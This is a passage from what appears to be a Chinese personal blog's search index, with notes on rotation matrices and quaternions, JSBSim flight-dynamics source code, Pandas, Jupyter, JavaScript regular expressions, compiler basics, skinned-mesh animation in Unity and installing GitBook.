\begin{matrix} c_y c_z & c_z s_x s_y - c_x s_z & s_x s_z + c_x c_z s_y\\ c_y s_z & c_x c_z + s_x s_y s_z & c_x s_y s_z - c_z s_z\\ -s_y & c_y s_x & c_x c_y \end{matrix} \right]由旋转矩阵求欧拉角R = \left[ \begin{matrix} r_{11} & r_{12} & r_{13}\\ r_{21} & r_{22} & r_{23}\\ r_{31} & r_{32} & r_{33} \end{matrix} \right] = \left[ \begin{matrix} c_y c_z & c_z s_x s_y - c_x s_z & s_x s_z + c_x c_z s_y\\ c_y s_z & c_x c_z + s_x s_y s_z & c_x s_y s_z - c_z s_z\\ -s_y & c_y s_x & c_x c_y \end{matrix} \right]解方程可得： \theta_x = atan2(r_{32}, r_{33})\theta_y = atan2(-r_{31}, \sqrt{r_{32}^2+r_{33}^2})\theta_z = atan2(r_{21}, r_{11})注意：atan2()为C++中的函数，atan2(y，x) 求的是y/x的反正切，其返回值为[-pi,+pi]之间的一个数。 四元数三维空间的任意旋转，都可以用绕三维空间的某个轴旋转过某个角度来表示，即所谓的Axis-Angle表示方法。这种表示方法里，Axis可用一个三维向量$(x,y,z)$来表示，$θ$可以用一个角度值来表示，直观来讲，一个四维向量$(θ,x,y,z)$就可以表示出三维空间任意的旋转。注意，这里的三维向量$(x,y,z)$只是用来表示axis的方向朝向，因此更紧凑的表示方式是用一个单位向量来表示方向axis，而用该三维向量的长度来表示角度值$θ$。这样以来，可以用一个三维向量$(θ∗x,θ∗y,θ∗z)$就可以表示出三维空间任意的旋转，前提是其中$(x,y,z)$是单位向量。这就是旋转向量(Rotation Vector)的表示方式，OpenCV里大量使用的就是这种表示方法来表示旋转(见OpenCV相机标定部分的rvec)。 单位向量(x,y,z)旋转θ角度后的四元数： (cos \frac{\theta}{2}, x*sin \frac{\theta}{2}, y*sin \frac{\theta}{2}, z*sin \frac{\theta}{2}) 对于三维坐标的旋转，可以通过四元数乘法直接操作，与旋转矩阵操作可以等价，但是表示方式更加紧凑，计算量也可以小一些。 四元数求旋转矩阵已知四元数: \mathbf{q} = q_0 + q_1 i + q_2 j + q_3 k = [s, \mathbf{v}]利用Rodrigues公式可以由四元数求得旋转矩阵R: R = \left[ \begin{matrix} 1 - 2 q_2^2 - 2 q_3^2 & 2q_1 q_2 - 2q_0 q_3 & 2 q_1 q_3 + 2 q_0 q_2 \\ 2q_1 q_2 + 2q_0 q_3 & 1 - 2 q_1^2 - 2 q_3^2 & 2 q_2 q_3 - 2 q_0 q_1 \\ 2 q_1 q_3 - 2 q_0 q_2 & 2 q_2 q_3 + 2 q_0 q_1 & 1 - 2 q_1^2 - 2 q_2^2 \end{matrix} \right ]旋转矩阵求四元数给出其中一种情况的计算方法： q_0 = \frac{\sqrt{1+r_{11}+r_{22}+r_{33}}}{2}q_1 = \frac{r_{32}-r_{23}}{4q_0}q_2 = \frac{r_{13}-r_{31}}{4q_0}q_3 = \frac{r_{21}-r_{12}}{4q_0}其中要满足 $q0 \neq 0$，$1+r{11}+r{22}+r{33}&gt;0$，即 $1+tr(R)&gt;0$ 参考链接 四元数,by wikipedia. 四元数与空间旋转,by wikipedia. 从旋转矩阵计算欧拉角,by PengChao. 旋转变换（一）旋转矩阵,by csxiaoshui. 旋转矩阵、欧拉角、四元数理论及其转换关系,by jason_ql. 旋转变换（二）欧拉角,by csxiaoshui. 欧拉角,by wikipedia. 欧拉角细节/旋转顺序/内旋外旋,by 能儿.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSBSim源代码分析]]></title>
    <url>%2F2020%2F01%2F13%2FJSBSim%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。JSBSim可以独立运行，通过命令行参数指定飞行器和初始状态，进行简单情境下的飞行动力学仿真，也可以将JSBSim作为代码库，编程实现飞行器模型加载，设置输入，获得输出。下面将通过分析JSBSim源代码，研究其实现通用飞行动力学模型的方法。 入口分析下面是JSBSim参考手册中的最简单实例，因JSBSim的不断开发，JSBSim参考手册中该编程实例有点过时，因此进行了少量修改。 1234567891011121314#include &lt;FGFDMExec.h&gt;#include &lt;sg_path.hxx&gt; using namespace std;int main(int argc, char **argv)&#123; JSBSim::FGFDMExec FDMExec; bool result = true; FDMExec.LoadScript(SGPath::fromUtf8(argv[1])); while (result) result = FDMExec.Run();&#125; 从上述代码可知，调用JSBSim的主要方法是利用FGFDMExec类，通过实例化一个FGFDMExec类，就相当于获得了一个运行JSBSim仿真的工具箱，通过这个工具箱就可以调用JSBSim的大部分功能，实现我们要的仿真目标。同时FGFDMExec类通过加载外部飞机的XML脚本，实现飞行动力学模型的通用性。 JSBSim初始化流程上述JSBSim最简仿真示例中已包含其初始化流程，采用图示如下： 图1 JSBSim初始化流程 FGFDMExec初始化FGFDMExec类在其构造函数中对各个模型进行初始化，具体代码在Allocate函数中： 12345678910111213FGFDMExec::FGFDMExec(FGPropertyManager* root, unsigned int* fdmctr) : Root(root), RandomEngine(new default_random_engine), FDMctr(fdmctr)&#123; ... try &#123; Allocate(); &#125; catch (const string&amp; msg ) &#123; cout &lt;&lt; &quot;Caught error: &quot; &lt;&lt; msg &lt;&lt; endl; exit(1); &#125; ...&#125; Allocate函数代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041bool FGFDMExec::Allocate(void)&#123; bool result=true; Models.resize(eNumStandardModels); // First build the inertial model since some other models are relying on // the inertial model and the ground callback to build themselves. // Note that this does not affect the order in which the models will be // executed later. Models[eInertial] = new FGInertial(this); // See the eModels enum specification in the header file. The order of the // enums specifies the order of execution. The Models[] vector is the primary // storage array for the list of models. Models[ePropagate] = new FGPropagate(this); Models[eInput] = new FGInput(this); Models[eAtmosphere] = new FGStandardAtmosphere(this); ... // Assign the Model shortcuts for internal executive use only. Propagate = (FGPropagate*)Models[ePropagate]; Inertial = (FGInertial*)Models[eInertial]; Atmosphere = (FGAtmosphere*)Models[eAtmosphere]; ... // Initialize planet (environment) constants LoadPlanetConstants(); // Initialize models for (unsigned int i = 0; i &lt; Models.size(); i++) &#123; // The Input/Output models must not be initialized prior to IC loading if (i == eInput || i == eOutput) continue; LoadInputs(i); Models[i]-&gt;InitModel(); &#125; ... return result;&#125; Allocate函数代码中需要注意LoadInputs函数，该函数决定各个子模型的初始化顺序，确定各个子模型的输入输出，具体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869void FGFDMExec::LoadInputs(unsigned int idx)&#123; switch(idx) &#123; case ePropagate: Propagate-&gt;in.vPQRidot = Accelerations-&gt;GetPQRidot(); Propagate-&gt;in.vUVWidot = Accelerations-&gt;GetUVWidot(); Propagate-&gt;in.DeltaT = dT; break; case eInput: break; case eInertial: Inertial-&gt;in.Position = Propagate-&gt;GetLocation(); break; case eAtmosphere: Atmosphere-&gt;in.altitudeASL = Propagate-&gt;GetAltitudeASL(); break; case eWinds: Winds-&gt;in.AltitudeASL = Propagate-&gt;GetAltitudeASL(); Winds-&gt;in.DistanceAGL = Propagate-&gt;GetDistanceAGL(); ... break; case eAuxiliary: Auxiliary-&gt;in.Pressure = Atmosphere-&gt;GetPressure(); Auxiliary-&gt;in.Density = Atmosphere-&gt;GetDensity(); ... break; case eSystems: // Dynamic inputs come into the components that FCS manages through properties break; case ePropulsion: Propulsion-&gt;in.Pressure = Atmosphere-&gt;GetPressure(); ... break; case eAerodynamics: Aerodynamics-&gt;in.Alpha = Auxiliary-&gt;Getalpha(); ... break; case eGroundReactions: // There are no external inputs to this model. GroundReactions-&gt;in.Vground = Auxiliary-&gt;GetVground(); ... break; case eExternalReactions: // There are no external inputs to this model. break; case eBuoyantForces: BuoyantForces-&gt;in.Density = Atmosphere-&gt;GetDensity(); ... break; case eMassBalance: MassBalance-&gt;in.GasInertia = BuoyantForces-&gt;GetGasMassInertia(); MassBalance-&gt;in.GasMass = BuoyantForces-&gt;GetGasMass(); ... break; case eAircraft: Aircraft-&gt;in.AeroForce = Aerodynamics-&gt;GetForces(); Aircraft-&gt;in.PropForce = Propulsion-&gt;GetForces(); ... break; case eAccelerations: Accelerations-&gt;in.J = MassBalance-&gt;GetJ(); Accelerations-&gt;in.Jinv = MassBalance-&gt;GetJinv(); ... break; default: break; &#125;&#125; FGFDMExec加载飞机配置FGFDMExec的LoadScript函数在初始化时负责加载飞机配置，用于初始化各个子模型。 12345678910bool FGFDMExec::LoadScript(const SGPath&amp; script, double deltaT, const SGPath&amp; initfile)&#123; bool result; Script = new FGScript(this); result = Script-&gt;LoadScript(GetFullPath(script), deltaT, initfile); return result;&#125; FGFDMExec运行FGFDMExec的Run函数负责飞行动力学模型的计算，其代码如下： 123456789101112131415161718bool FGFDMExec::Run(void)&#123; bool success=true; ... // returns true if success, false if complete if (Script != 0 &amp;&amp; !IntegrationSuspended()) success = Script-&gt;RunScript(); for (unsigned int i = 0; i &lt; Models.size(); i++) &#123; LoadInputs(i); Models[i]-&gt;Run(holding); &#125; ... return success;&#125; FGFDMExec的Run函数将依次调用各个子模型的Run函数。 参考链接 JSBSim编程实践之入门,by jackhuang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序算法总结]]></title>
    <url>%2F2020%2F01%2F05%2F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[排序算法是计算机科学的基石之一，可从时间复杂度、空间复杂度、稳定性、是否原地排序等维度对排序算法进行分类。下面从时间复杂度方面对排序算法进行分类。 O(n^2)算法冒泡排序选择排序插入排序O(nlogn)算法希尔排序快速排序归并排序堆排序O(n)算法计数排序桶排序基数排序参考链接 漫画：“排序算法” 大总结,by 小灰.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pandas入门教程]]></title>
    <url>%2F2020%2F01%2F02%2FPandas%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Pandas是一个开源的，BSD许可的库，为Python编程语言提供高性能，易于使用的数据结构和数据分析工具。 Pandas特色Pandas 适用于处理以下类型的数据： 与 SQL 或 Excel 表类似的，含异构列的表格数据; 有序和无序（非固定频率）的时间序列数据; 带行列标签的矩阵数据，包括同构或异构型数据; 任意其它形式的观测、统计数据集, 数据转入 Pandas 数据结构时不必事先标记。 Pandas数据结构Pandas 的主要数据结构是 Series（一维数据）与 DataFrame（二维数据），这两种数据结构足以处理金融、统计、社会科学、工程等领域里的大多数典型用例。对于 R 用户，DataFrame 提供了比 R 语言 data.frame 更丰富的功能。Pandas 基于 NumPy 开发，可以与其它第三方科学计算支持库完美集成。 维数 名称 描述 1 Series 带标签的一维同构数组 2 DataFrame 带标签的，大小可变的，二维异构表格 Pandas用法Pandas用法与Matlab中矩阵操作很类似，熟悉Matlab操作的同学可以很快上手Pandas。 生成对象生成Series对象： 1234567891011In [3]: s = pd.Series([1, 3, 5, np.nan, 6, 8])In [4]: sOut[4]: 0 1.01 3.02 5.03 NaN4 6.05 8.0dtype: float64 生成DataFrame对象： 1234567891011In [7]: df = pd.DataFrame(np.random.randn(6, 4), index=dates, columns=list(&apos;ABCD&apos;))In [8]: dfOut[8]: A B C D2013-01-01 0.469112 -0.282863 -1.509059 -1.1356322013-01-02 1.212112 -0.173215 0.119209 -1.0442362013-01-03 -0.861849 -2.104569 -0.494929 1.0718042013-01-04 0.721555 -0.706771 -1.039575 0.2718602013-01-05 -0.424972 0.567020 0.276232 -1.0874012013-01-06 -0.673690 0.113648 -1.478427 0.524988 参考链接 Pandas 中文,by pypandas. 十分钟入门 Pandas,by pypandas. Python读取csv文件的三种方式,by 涛声依旧2019. Python模块化开发组织代码程序示例,by BabyFish13. Python最佳实践指南！,by Prodesire.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jupyter notebook安装与使用]]></title>
    <url>%2F2019%2F12%2F31%2Fjupyter_notebook%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Jupyter Notebook（前身是IPython Notebook）是一个基于Web的交互式计算环境，用于创建Jupyter Notebook文档。Notebook一词可以通俗地引用许多不同的实体，主要是Jupyter Web应用程序、Jupyter Python Web服务器或Jupyter文档格式（取决于上下文）。Jupyter Notebook文档是一个JSON文档，遵循版本化模式，包含一个有序的输入/输出单元格列表，这些单元格可以包含代码、文本（使用Markdown语言）、数学、图表和富媒体，通常以“.ipynb”结尾扩展。 安装过程安装前提 python&gt;3.3 或者python=2.7 安装步骤1pip install notebook 启动Jupyter Notebook1jupyter notebook 参考链接 Jupyter,by wikipedia. Installing the Jupyter Software,by jupyter. Matplotlib animation not working in IPython Notebook (blank plot),by stackoverflow.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript正则表达式入门]]></title>
    <url>%2F2019%2F12%2F30%2FJavaScript%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[最近在学习逐行剖析 Vue.js 源码的时候，发现Vuejs在模板编译时大量使用正则表达式。因此，将正则表达式的知识再温习一下。 基本概念正则表达式是用于匹配字符串中字符组合的模式。在 JavaScript中，正则表达式也是对象。这些模式被用于 RegExp 的 exec 和 test 方法, 以及 String 的 match、matchAll、replace、search 和 split 方法。 基本语法特殊字符正则表达式中的特殊字符: \依照下列规则匹配： 在非特殊字符之前的反斜杠表示下一个字符是特殊字符，不能按照字面理解。例如，前面没有 “\” 的 “b” 通常匹配小写字母 “b”，即字符会被作为字面理解，无论它出现在哪里。但如果前面加了 “\”，它将不再匹配任何字符，而是表示一个字符边界。 在特殊字符之前的反斜杠表示下一个字符不是特殊字符，应该按照字面理解。详情请参阅下文中的 “转义（Escaping）” 部分。 如果你想将字符串传递给 RegExp 构造函数，不要忘记在字符串字面量中反斜杠是转义字符。所以为了在模式中添加一个反斜杠，你需要在字符串字面量中转义它。/[a-z]\s/i 和 new RegExp(“[a-z]\s”, “i”) 创建了相同的正则表达式：一个用于搜索后面紧跟着空白字符（\s 可看后文）并且在 a-z 范围内的任意字符的表达式。为了通过字符串字面量给 RegExp 构造函数创建包含反斜杠的表达式，你需要在字符串级别和表达式级别都对它进行转义。例如 /[a-z]:\/i 和 new RegExp(“[a-z]:\\“,”i”) 会创建相同的表达式，即匹配类似 “C:\” 字符串。 ^匹配输入的开始。如果多行标志被设置为 true，那么也匹配换行符后紧跟的位置。 例如，/^A/ 并不会匹配 “an A” 中的 ‘A’，但是会匹配 “An E” 中的 ‘A’。 当 ‘^’ 作为第一个字符出现在一个字符集合模式时，它将会有不同的含义。反向字符集合 一节有详细介绍和示例。 $匹配输入的结束。如果多行标示被设置为 true，那么也匹配换行符前的位置。 例如，/t$/ 并不会匹配 “eater” 中的 ‘t’，但是会匹配 “eat” 中的 ‘t’。 *匹配前一个表达式 0 次或多次。等价于 {0,}。 例如，/bo*/ 会匹配 “A ghost boooooed” 中的 ‘booooo’ 和 “A bird warbled” 中的 ‘b’，但是在 “A goat grunted” 中不会匹配任何内容。 +匹配前面一个表达式 1 次或者多次。等价于 {1,}。 例如，/a+/ 会匹配 “candy” 中的 ‘a’ 和 “caaaaaaandy” 中所有的 ‘a’，但是在 “cndy” 中不会匹配任何内容。 ?匹配前面一个表达式 0 次或者 1 次。等价于 {0,1}。 例如，/e?le?/ 匹配 “angel” 中的 ‘el’、”angle” 中的 ‘le’ 以及 “oslo’ 中的 ‘l’。 如果紧跟在任何量词 *、 +、? 或 {} 的后面，将会使量词变为非贪婪（匹配尽量少的字符），和缺省使用的贪婪模式（匹配尽可能多的字符）正好相反。例如，对 “123abc” 使用 /\d+/ 将会匹配 “123”，而使用 /\d+?/ 则只会匹配到 “1”。 还用于先行断言中，如本表的 x(?=y) 和 x(?!y) 条目所述。 .小数点）默认匹配除换行符之外的任何单个字符。 例如，/.n/ 将会匹配 “nay, an apple is on the tree” 中的 ‘an’ 和 ‘on’，但是不会匹配 ‘nay’。 如果 s (“dotAll”) 标志位被设为 true，它也会匹配换行符。 \n在正则表达式中，它返回最后的第n个子捕获匹配的子字符串(捕获的数目以左括号计数)。 比如 /apple(,)\sorange\1/ 匹配”apple, orange, cherry, peach.”中的’apple, orange,’ 。 \s匹配一个空白字符，包括空格、制表符、换页符和换行符。等价于[ \f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]。 例如, /\s\w*/ 匹配”foo bar.”中的’ bar’。 \w匹配一个单字字符（字母、数字或者下划线）。等价于 [A-Za-z0-9_]。 例如, /\w/ 匹配 “apple,” 中的 ‘a’，”$5.28,”中的 ‘5’ 和 “3D.” 中的 ‘3’。 \W匹配一个非单字字符。等价于 A-Za-z0-9_。 例如, /\W/ 或者 /A-Za-z0-9_/ 匹配 “50%.” 中的 ‘%’。 (x)像下面的例子展示的那样，它会匹配 ‘x’ 并且记住匹配项。其中括号被称为捕获括号。 模式 /(foo) (bar) \1 \2/ 中的 ‘(foo)’ 和 ‘(bar)’ 匹配并记住字符串 “foo bar foo bar” 中前两个单词。模式中的 \1 和 \2 表示第一个和第二个被捕获括号匹配的子字符串，即 foo 和 bar，匹配了原字符串中的后两个单词。注意 \1、\2、…、\n 是用在正则表达式的匹配环节，详情可以参阅后文的 \n 条目。而在正则表达式的替换环节，则要使用像 $1、$2、…、$n 这样的语法，例如，’bar foo’.replace(/(…) (…)/, ‘$2 $1’)。$&amp; 表示整个用于匹配的原字符串。 标志 标志 描述 g 全局搜索。 i 不区分大小写搜索。 m 多行搜索。 s 允许 . 匹配换行符。 u 使用unicode码的模式进行匹配。 y 执行“粘性”搜索,匹配从目标字符串的当前位置开始，可以使用y标 志。 使用方法正则表达式可以被用于 RegExp 的 exec 和 test 方法以及 String 的 match、replace、search 和 split 方法。使用正则表达式的方法如下： 方法 方法 描述 exec 一个在字符串中执行查找匹配的RegExp方法，它返回一个数组（未匹配到则返回 null）。 test 一个在字符串中测试是否匹配的RegExp方法，它返回 true 或 false。 match 一个在字符串中执行查找匹配的String方法，它返回一个数组，在未匹配到时会返回 null。 matchAll 一个在字符串中执行查找所有匹配的String方法，它返回一个迭代器（iterator）。 search 一个在字符串中测试匹配的String方法，它返回匹配到的位置索引，或者在失败时返回-1。 replace 一个在字符串中执行查找匹配的String方法，并且使用替换字符串替换掉匹配到的子字符串。 split 一个使用正则表达式或者一个固定字符串分隔一个字符串，并将分隔后的子字符串存储到数组中的 String 方法。 返回 对象 属性或索引 描述 在例子中对应的值 myArray 匹配到的字符串和所有被记住的子字符串。 [“dbbd”, “bb”] myArray index 在输入的字符串中匹配到的以0开始的索引值。 1 myArray input 初始字符串。 “cdbbdbsbz” myArray [0] 匹配到的所有字符串（并不是匹配后记住的字符串）。注：原文”The last matched characters.”，应该是原版错误。匹配到的最终字符。 “dbbd” myRe lastIndex 下一个匹配的索引值。（这个属性只有在使用g参数时可用在 通过参数进行高级搜索 一节有详细的描述.) 5 myRe source 模式文本。在正则表达式创建时更新，不执行。 “d(b+)d” 示例123456var re = /\w+\s/g;var str = &quot;fee fi fo fum&quot;;var myArray = str.match(re);console.log(myArray);// [&quot;fee &quot;, &quot;fi &quot;, &quot;fo &quot;] 参考链接 逐行剖析 Vue.js 源码,by nlrx. 正则表达式,by mozilla.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编译原理学习笔记]]></title>
    <url>%2F2019%2F12%2F29%2F%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[编译原理是计算机专业的一门重要专业课，旨在介绍编译程序构造的一般原理和基本方法。内容包括语言和文法、词法分析、语法分析、语法制导翻译、中间代码生成、存储管理、代码优化和目标代码生成。 基本概念 词法分析 从左到右逐个字符地扫描，从中识别出一个个“单词”符号。“单词”符号是程序设计语言的基本语法单位，如关键字、标识符、常数、运算符和分隔符等。 语法分析 根据语言的语法规则将单词符号序列分解成各类语法单位，比如表达式、语句和程序等。语法规则就是各类语法单位的构成规则。通过语法分析确定整个输入串是否构成一个语法上正确的程序。 语义分析 检查源程序是否包含静态语义错误，并收集类型信息供后面的代码生成阶段使用。只有语法和语义都正确的源程序才能被翻译成正确的目标代码。 语义分析的一个主要工作是进行类型分析和检查。程序语言中的一个数据类型一般包含两个方面的内容：类型的载体及其上的运算。例如：整除取余运算只能对整型数据进行运算，若其运算对象中有浮点数就认为是类型不匹配的错误。静态的语义错误是指编译程序可以发现，动态的语义错误是指源程序虽然能够被编译和执行，但是结果不对，一般是逻辑上的错误。 编译的过程编译程序的工作过程一般可以分为5个阶段： 词法分析 语法分析 语义分析和中间代码的产生 优化 目标代码生成 参考链接 AST 抽象语法树,by Jartto. 【编译原理】编译原理简单介绍,by cflys. 编译原理,by junhey.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3D模型动画分类及其使用]]></title>
    <url>%2F2019%2F12%2F28%2F3D%E6%A8%A1%E5%9E%8B%E5%8A%A8%E7%94%BB%E5%88%86%E7%B1%BB%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[3DMax、Blender之类的3D建模软件易学难精，其原因在于很多人不了解其背后的计算机图形学原理。因此，掌握相关的计算机图形学原理和知识，对于我们熟练运用3D建模软件是十分必要的。下面简单介绍3D模型的分类及其使用方法。 3D模型动画分类 3D模型动画的基本原理是让模型中各顶点的位置随时间变化。 主要种类有Morph（变形）动画，关节动画和骨骼蒙皮动画(SkinnedMesh)。从动画数据的角度来说，三者一般都采用关键帧技术，即只给出关键帧的数据，其他帧的数据使用插值得到。但由于这三种技术的不同，关键帧的数据是不一样的。 变形动画 Morph（渐变，变形）动画是直接指定动画每一帧的顶点位置，其动画关键中存储的是Mesh所有顶点在关键帧对应时刻的位置。 关节动画 关节动画的模型不是一个整体的Mesh,而是分成很多部分(Mesh)，通过一个父子层次结构将这些分散的Mesh组织在一起，父Mesh带动其下子Mesh的运动，各Mesh中的顶点坐标定义在自己的坐标系中，这样各个Mesh是作为一个整体参与运动的。 动画帧中设置各子Mesh相对于其父Mesh的变换（主要是旋转，当然也可包括移动和缩放），通过子到父，一级级的变换累加（当然从技术上，如果是矩阵操作是累乘）得到该Mesh在整个动画模型所在的坐标空间中的变换（从本文的视角来说就是世界坐标系了，下同），从而确定每个Mesh在世界坐标系中的位置和方向，然后以Mesh为单位渲染即可。 关节动画的问题是，各部分Mesh中的顶点是固定在其Mesh坐标系中的，这样在两个Mesh结合处就可能产生裂缝。 骨骼蒙皮动画 骨骼蒙皮动画即SkinnedMesh了，骨骼蒙皮动画的出现解决了关节动画的裂缝问题。骨骼动画的基本原理可概括为：在骨骼控制下，通过顶点混合动态计算蒙皮网格的顶点，而骨骼的运动相对于其父骨骼，并由动画关键帧数据驱动。 一个骨骼动画通常包括骨骼层次结构数据，网格(Mesh)数据，网格蒙皮数据(skin info)和骨骼的动画(关键帧)数据。 SkinnedMesh原理 SkinnedMesh中文一般称作骨骼蒙皮动画，正如其名，这种动画中包含骨骼（Bone）和蒙皮(Skinned Mesh)两个部分，Bone的层次结构和关节动画类似，Mesh则和关节动画不同： 关节动画中是使用多个分散的Mesh,而Skinned Mesh中Mesh是一个整体，也就是说只有一个Mesh,实际上如果没有骨骼让Mesh运动变形，Mesh就和静态模型一样了。 Skinned Mesh技术的精华在于蒙皮，所谓的皮并不是模型的贴图（也许会有人这么想过吧），而是Mesh本身，蒙皮是指将Mesh中的顶点附着（绑定）在骨骼之上，而且每个顶点可以被多个骨骼所控制，这样在关节处的顶点由于同时受到父子骨骼的拉扯而改变位置就消除了裂缝。 Skinned Mesh这个词从字面上理解似乎是有皮的模型，哦，如果贴图是皮，那么普通静态模型不也都有吗？所以我觉得应该理解为具有蒙皮信息的Mesh或可当做皮肤用的Mesh，这个皮肤就是Mesh。而为了有皮肤功能，Mesh还需要蒙皮信息，即Skin数据，没有Skin数据就是一个普通的静态Mesh了。 Skin数据决定顶点如何绑定到骨骼上。顶点的Skin数据包括顶点受哪些骨骼影响以及这些骨骼影响该顶点时的权重(weight)，另外对于每块骨骼还需要骨骼偏移矩阵(BoneOffsetMatrix)用来将顶点从Mesh空间变换到骨骼空间。 SkinnedMesh结构 骨骼决定了模型整体在世界坐标系中的位置和朝向。 先看看静态模型吧，静态模型没有骨骼，我们在世界坐标系中放置静态模型时，只要指定模型自身坐标系在世界坐标系中的位置和朝向。在骨骼动画中，不是把Mesh直接放到世界坐标系中，Mesh只是作为Skin使用的，是依附于骨骼的，真正决定模型在世界坐标系中的位置和朝向的是骨骼。 在渲染静态模型时，由于模型的顶点都是定义在模型坐标系中的，所以各顶点只要经过模型坐标系到世界坐标系的变换后就可进行渲染。而对于骨骼动画，我们设置模型的位置和朝向，实际是在设置根骨骼的位置和朝向，然后根据骨骼层次结构中父子骨骼之间的变换关系计算出各个骨骼的位置和朝向，然后根据骨骼对Mesh中顶点的绑定计算出顶点在世界坐标系中的坐标，从而对顶点进行渲染。要记住，在骨骼动画中，骨骼才是模型主体，Mesh不过是一层皮，一件衣服。 骨骼可理解为一个坐标空间。 骨骼只是一个形象的说法，实际上骨骼可理解为一个坐标空间，关节可理解为骨骼坐标空间的原点。关节的位置由它在父骨骼坐标空间中的位置描述。上图中有三块骨骼，分别是上臂，前臂和两个手指。Clavicle(锁骨)是一个关节，它是上臂的原点，同样肘关节(elbow joint)是前臂的原点，腕关节(wrist)是手指骨骼的原点。关节既决定了骨骼空间的位置，又是骨骼空间的旋转和缩放中心。 骨骼就是坐标空间，骨骼层次就是嵌套的坐标空间。关节只是描述骨骼的位置即骨骼自己的坐标空间原点在其父空间中的位置，绕关节旋转是指骨骼坐标空间（包括所有子空间）自身的旋转。 但还有两个可能的疑问，一是骨骼的长度问题，由于骨骼是坐标空间，没有所谓的长度和宽度的限制，我们看到的长度一方面是蒙皮后的结果，另一方面子骨骼的原点（也就是关节）的位置往往决定了视觉上父骨骼的长度，比如这里upper arm线段的长度实际是由elbow joint的位置决定的。 第二个问题，手指的那个端点是啥啊？实际上在我们的例子中手指没有子骨骼，所以那个端点并不存在：）那是为了方便演示画上去的。实际问题中总有最下层的骨骼，他们不能决定其他骨骼了，他们的作用只剩下控制Mesh顶点。对了，那么手指的长度如何确定？我们看到的长度应该是由蒙皮决定的，也就是由Mesh中属于手指的那些点离腕关节的距离决定。 3D模型动画使用下面给出一段在Unity3D中控制3D模型动画的代码，作为参考。 12345678910111213141516171819202122232425262728using UnityEngine;using System.Collections; public class AnimationScript : MonoBehaviour&#123; void Start() &#123; Animation animation = this.animation;//动画控制器 animation.Play(&quot;idle&quot;);//上来直接播放idle动画 &#125; void OnGUI() &#123; if (GUI.Button(new Rect(0, 0, 100, 30), &quot;行走&quot;)) &#123; animation.Play(&quot;run&quot;); &#125; if (GUI.Button(new Rect(100, 0, 100, 30), &quot;停止&quot;)) &#123; animation.Play(&quot;idle&quot;); &#125; if (GUI.Button(new Rect(200, 0, 100, 30), &quot;攻击&quot;)) &#123; animation.Play(&quot;attack&quot;); animation.PlayQueued(&quot;idle&quot;);//播放完attack之后再播放idle &#125; &#125;&#125; 参考链接 骨骼蒙皮动画(SkinnedMesh)的原理解析,by feng. 【Unity3D】3D模型的使用——FBX的使用与Animation设置,by yongh701.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitBook入门教程]]></title>
    <url>%2F2019%2F12%2F26%2Fgitbook%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[GitBook是一种制作在线书籍的工具。它基于Git支持多人协作，支持将采用Markdown语法编辑的文档导出成 PDF，EPUB，HTML等多种格式。 GitBook安装环境要求 NodeJS (v4.0.0 and above is recommended) Windows, Linux, Unix, or Mac OS X NPM安装GitBook通过NPM工具安装GitBook是最佳的方法： 12$ npm install gitbook-cli -g$ gitbook init //下载稳定版的gitbook，同时创建在线书籍 gitbook-cli工具可安装多个GitBook版本到系统上。对于Windows平台，gitbook-cli工具安装的多个GitBook版本通常存储在“C:\Users\CurrentLoginUser\.gitbook”。 离线安装GitBook内网机器上安装GitBook的方法如下： 安装最新Nodejs长期支持版。 使用npm-bundle命令在线打包gitbook-cli 12npm install npm-bundle -gnpm-bundle gitbook-cli 内网机器上安装gitbook-cli 1npm install ./gitbook-cli.tgz 将“C:\Users\CurrentLoginUser\.gitbook”目录打包拷贝至内网机器对应位置 创建书籍123$ gitbook init //在当前目录创建书籍$ gitbook build //构建在线书籍网站$ gitbook serve //构建在线书籍网站并启动 参考链接 GitBook 从懵逼到入门,by 阿基米东. 使用 Gitbook 打造你的电子书,by 文艺小青年. 世上最佳离线markdown编辑工具（gitbook和gitbook editor）,by icharm. 移除GitBook目录下方的“本书使用GitBook发布”字样,by tedxiong. EbookError: Error during ebook generation: 